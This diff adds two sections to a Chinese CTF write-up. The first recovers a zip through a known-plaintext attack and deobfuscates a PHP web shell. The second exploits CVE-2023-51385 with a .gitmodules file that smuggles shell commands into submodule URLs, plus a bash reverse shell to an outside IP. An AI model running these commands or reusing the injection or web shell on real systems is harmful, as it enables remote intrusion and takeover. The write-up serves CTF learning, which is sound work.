@@ -66,6 +66,85 @@ print(result)
 
 CyberChef 中 reverse 一下即可得到最后的 flag：flag{W1sh_y0u_AaaAaaaaaaaaaaa_w0nderfu1_CTF_journe9}
 
+## 明文混淆
+
+附件给了一个压缩包，打开一看发现是 store 加密，因此猜测需要明文攻击
+
+![](imgs/image-20240717211823123.png)
+
+去网上搜了一下文件大小为 35821 的 LICENSE.txt，发现有个统一的标题
+
+![](imgs/image-20240717211804575.png)
+
+![](imgs/image-20240717211914785.png)
+
+这个标题的长度也满足了明文攻击的要求，因此我们使用 bkcrack 进行明文攻击
+
+![](imgs/image-20240717212014643.png)
+
+在 shell2.php 中得到以下 php 代码，是微盾php混淆
+
+```php
+&lt;?php
+$O00OO0=urldecode(&#34;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&#34;);$O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30};$O0OO00=$O00OO0{33}.$O00OO0{10}.$O00OO0{24}.$O00OO0{10}.$O00OO0{24};$OO0O00=$O0OO00{0}.$O00OO0{18}.$O00OO0{3}.$O0OO00{0}.$O0OO00{1}.$O00OO0{24};$OO0000=$O00OO0{7}.$O00OO0{13};$O00O0O.=$O00OO0{22}.$O00OO0{36}.$O00OO0{29}.$O00OO0{26}.$O00OO0{30}.$O00OO0{32}.$O00OO0{35}.$O00OO0{26}.$O00OO0{30};eval($O00O0O(&#34;JE8wTzAwMD0idVNxTHlDandXcFpIaGlLbWZGR1ZUQmFOcllvSXpsZWd4Sk1iUkRVRUFrUWN0bnZzZE9QWGladnVUYWdmY0hiWFloZVdNeUtObEx3U2pvQ25ydEFCeE9RRHNKcGRrUG1JekdFVlJVRnFGSjlmd1hrZWJxYllEYVlHQVd0aWJXeFlSS3BDb1d5cmJsbzBxMnN0bzI5UGJaQkdObExHUnlRNEF0T2dzUFNlc2E5THBkc0VEeVJwVVhzZU5kVjRScDVyUjNtNHNkUkZJR0hPSTJ0bmJQdGxTS3oybEdIYkFHSE53Z3k1TlBiTk5QejROV0M1TnJMMElXU2RtcGQ5RlpJSGVaUDdua0MvRkI9PSI7ZXZhbCgnPz4nLiRPMDBPME8oJE8wT08wMCgkT08wTzAwKCRPME8wMDAsJE9PMDAwMCoyKSwkT08wTzAwKCRPME8wMDAsJE9PMDAwMCwkT08wMDAwKSwkT08wTzAwKCRPME8wMDAsMCwkT08wMDAwKSkpKTs=&#34;));
+?&gt;
+```
+
+这里这道题比较简单，只要按照步骤依次 echo 出来就能得到 flag
+
+```php
+&lt;?php
+$O00OO0=urldecode(&#34;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&#34;);
+$O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30};
+$O0OO00=$O00OO0{33}.$O00OO0{10}.$O00OO0{24}.$O00OO0{10}.$O00OO0{24};
+$OO0O00=$O0OO00{0}.$O00OO0{18}.$O00OO0{3}.$O0OO00{0}.$O0OO00{1}.$O00OO0{24};
+$OO0000=$O00OO0{7}.$O00OO0{13};
+$O00O0O.=$O00OO0{22}.$O00OO0{36}.$O00OO0{29}.$O00OO0{26}.$O00OO0{30}.$O00OO0{32}.$O00OO0{35}.$O00OO0{26}.$O00OO0{30};
+eval($O00O0O(&#34;JE8wTzAwMD0idVNxTHlDandXcFpIaGlLbWZGR1ZUQmFOcllvSXpsZWd4Sk1iUkRVRUFrUWN0bnZzZE9QWGladnVUYWdmY0hiWFloZVdNeUtObEx3U2pvQ25ydEFCeE9RRHNKcGRrUG1JekdFVlJVRnFGSjlmd1hrZWJxYllEYVlHQVd0aWJXeFlSS3BDb1d5cmJsbzBxMnN0bzI5UGJaQkdObExHUnlRNEF0T2dzUFNlc2E5THBkc0VEeVJwVVhzZU5kVjRScDVyUjNtNHNkUkZJR0hPSTJ0bmJQdGxTS3oybEdIYkFHSE53Z3k1TlBiTk5QejROV0M1TnJMMElXU2RtcGQ5RlpJSGVaUDdua0MvRkI9PSI7ZXZhbCgnPz4nLiRPMDBPME8oJE8wT08wMCgkT08wTzAwKCRPME8wMDAsJE9PMDAwMCoyKSwkT08wTzAwKCRPME8wMDAsJE9PMDAwMCwkT08wMDAwKSwkT08wTzAwKCRPME8wMDAsMCwkT08wMDAwKSkpKTs=&#34;));
+//echo $O00O0O(&#34;JE8wTzAwMD0idVNxTHlDandXcFpIaGlLbWZGR1ZUQmFOcllvSXpsZWd4Sk1iUkRVRUFrUWN0bnZzZE9QWGladnVUYWdmY0hiWFloZVdNeUtObEx3U2pvQ25ydEFCeE9RRHNKcGRrUG1JekdFVlJVRnFGSjlmd1hrZWJxYllEYVlHQVd0aWJXeFlSS3BDb1d5cmJsbzBxMnN0bzI5UGJaQkdObExHUnlRNEF0T2dzUFNlc2E5THBkc0VEeVJwVVhzZU5kVjRScDVyUjNtNHNkUkZJR0hPSTJ0bmJQdGxTS3oybEdIYkFHSE53Z3k1TlBiTk5QejROV0M1TnJMMElXU2RtcGQ5RlpJSGVaUDdua0MvRkI9PSI7ZXZhbCgnPz4nLiRPMDBPME8oJE8wT08wMCgkT08wTzAwKCRPME8wMDAsJE9PMDAwMCoyKSwkT08wTzAwKCRPME8wMDAsJE9PMDAwMCwkT08wMDAwKSwkT08wTzAwKCRPME8wMDAsMCwkT08wMDAwKSkpKTs=&#34;);
+
+$O0O000=&#34;uSqLyCjwWpZHhiKmfFGVTBaNrYoIzlegxJMbRDUEAkQctnvsdOPXiZvuTagfcHbXYheWMyKNlLwSjoCnrtABxOQDsJpdkPmIzGEVRUFqFJ9fwXkebqbYDaYGAWtibWxYRKpCoWyrblo0q2sto29PbZBGNlLGRyQ4AtOgsPSesa9LpdsEDyRpUXseNdV4Rp5rR3m4sdRFIGHOI2tnbPtlSKz2lGHbAGHNwgy5NPbNNPz4NWC5NrL0IWSdmpd9FZIHeZP7nkC/FB==&#34;;
+/*eval(&#39;?&gt;&#39;.$O00O0O($O0OO00($OO0O00($O0O000,$OO0000*2),$OO0O00($O0O000,$OO0000,$OO0000),$OO0O00($O0O000,0,$OO0000))));*/
+
+/*echo &#39;?&gt;&#39;.$O00O0O($O0OO00($OO0O00($O0O000,$OO0000*2),$OO0O00($O0O000,$OO0000,$OO0000),$OO0O00($O0O000,0,$OO0000)));*/
+//eval(gzinflate(base64_decode(&#39;U0gtS8zRcFCJD/APDolWT8tJTK8uNswt8DGOrzIsiHfIS4kvNzYzzUj1yVFUVKxVj9W0trcDAA==&#39;)));
+echo gzinflate(base64_decode(&#39;U0gtS8zRcFCJD/APDolWT8tJTK8uNswt8DGOrzIsiHfIS4kvNzYzzUj1yVFUVKxVj9W0trcDAA==&#39;));
+//eval(@$_POST[&#39;flag{s1mpL3_z1p_@nd_w365heLl!!!}&#39;]);?&gt;
+?&gt;
+```
+
+flag{s1mpL3_z1p_@nd_w365heLl!!!}&#39;
+
+## Module
+
+CVE-2023-51385
+
+参考博客：
+
+https://blog.csdn.net/weixin_46944519/article/details/135249657
+
+在国内的 Gitee 上新建一个仓库包含以下两个文件，然后直接 git clone -v  项目地址 --recurse-submodules 即可
+
+.gitmodules 文件内容如下：
+
+```
+[submodule &#34;cve&#34;]
+	path = cve
+	url = https://`echo helloworld &gt; cve.txt`foo.ichunqiu.com/bar
+[submodule &#34;test&#34;]
+	path = test
+	url = ssh://`bash shell.sh`foo.ichunqiu.com/bar
+```
+
+shell.sh 内容如下：
+
+```bash
+bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/8.130.93.84/3232 &lt;&amp;1&#39;
+```
+
+![](imgs/image-20240717215804819.png)
+
+
 ---
 
 > Author: [Lunatic](https://goodlunatic.github.io)  
